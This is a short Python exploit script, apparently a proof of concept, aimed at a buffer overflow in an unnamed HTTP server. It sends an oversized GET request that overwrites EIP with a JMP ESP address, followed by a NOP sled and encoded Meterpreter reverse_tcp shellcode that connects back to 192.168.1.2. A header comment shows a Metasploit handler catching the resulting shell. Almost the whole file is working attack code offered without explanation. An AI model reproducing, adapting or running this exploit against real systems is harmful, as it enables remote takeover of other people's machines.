#!/usr/bin/python
#
# msf > use multi/handler
# msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
# payload => windows/meterpreter/reverse_tcp
# msf exploit(handler) > set lhost 192.168.1.2
# lhost => 192.168.1.2
# msf exploit(handler) > exploit
#
# [*] Started reverse handler on 192.168.1.2:4444 
# [*] Starting the payload handler...
# [*] Sending stage (749056 bytes) to 192.168.1.4
# [*] Meterpreter session 1 opened (192.168.1.2:4444 -> 192.168.1.4:1077) at 2011-11-23 13:36:23 +0800
#
# meterpreter >
#
import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1], 80))

buffer = "GET "

# 1787 bytes until EIP gets overwritten
buffer += "A"*1787

# JMP ESP in user32.dll
buffer += "\x13\x53\x45\x7e"

# NOPSLED
buffer += "\x90"*16

# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 R | msfencode -a x86 -b "\x00\x0d" -t c
buffer += ("\xda\xc7\xd9\x74\x24\xf4\xba\x01\x76\x2f\x06\x5e\x29\xc9\xb1"
"\x49\x83\xc6\x04\x31\x56\x15\x03\x56\x15\xe3\x83\xd3\xee\x6a"
"\x6b\x2c\xef\x0c\xe5\xc9\xde\x1e\x91\x9a\x73\xae\xd1\xcf\x7f"
"\x45\xb7\xfb\xf4\x2b\x10\x0b\xbc\x81\x46\x22\x3d\x24\x47\xe8"
"\xfd\x27\x3b\xf3\xd1\x87\x02\x3c\x24\xc6\x43\x21\xc7\x9a\x1c"
"\x2d\x7a\x0a\x28\x73\x47\x2b\xfe\xff\xf7\x53\x7b\x3f\x83\xe9"
"\x82\x10\x3c\x66\xcc\x88\x36\x20\xed\xa9\x9b\x33\xd1\xe0\x90"
"\x87\xa1\xf2\x70\xd6\x4a\xc5\xbc\xb4\x74\xe9\x30\xc5\xb1\xce"
"\xaa\xb0\xc9\x2c\x56\xc2\x09\x4e\x8c\x47\x8c\xe8\x47\xff\x74"
"\x08\x8b\x99\xff\x06\x60\xee\x58\x0b\x77\x23\xd3\x37\xfc\xc2"
"\x34\xbe\x46\xe0\x90\x9a\x1d\x89\x81\x46\xf3\xb6\xd2\x2f\xac"
"\x12\x98\xc2\xb9\x24\xc3\x8a\x0e\x1a\xfc\x4a\x19\x2d\x8f\x78"
"\x86\x85\x07\x31\x4f\x03\xdf\x36\x7a\xf3\x4f\xc9\x85\x03\x59"
"\x0e\xd1\x53\xf1\xa7\x5a\x38\x01\x47\x8f\xee\x51\xe7\x60\x4e"
"\x02\x47\xd1\x26\x48\x48\x0e\x56\x73\x82\x27\xfc\x89\x45\x88"
"\xa8\x93\x97\x60\xaa\x93\x86\x2c\x23\x75\xc2\xdc\x65\x2d\x7b"
"\x44\x2c\xa5\x1a\x89\xfb\xc3\x1d\x01\x0f\x33\xd3\xe2\x7a\x27"
"\x84\x02\x31\x15\x03\x1c\xec\x30\xac\x88\x0a\x93\xfb\x24\x10"
"\xc2\xcc\xea\xeb\x21\x47\x22\x79\x8a\x30\x4b\x6d\x0a\xc1\x1d"
"\xe7\x0a\xa9\xf9\x53\x59\xcc\x05\x4e\xcd\x5d\x90\x70\xa4\x32"
"\x33\x18\x4a\x6c\x73\x87\xb5\x5b\x85\xf4\x63\xa2\x03\x0c\x06"
"\xc6\xcf")

buffer += " HTTP/1.1\r\n\r\n"

sock.send(buffer)
print '[*] --> Payload sent successfully'
print '[*] --> w00t!w00t!'
sock.close()
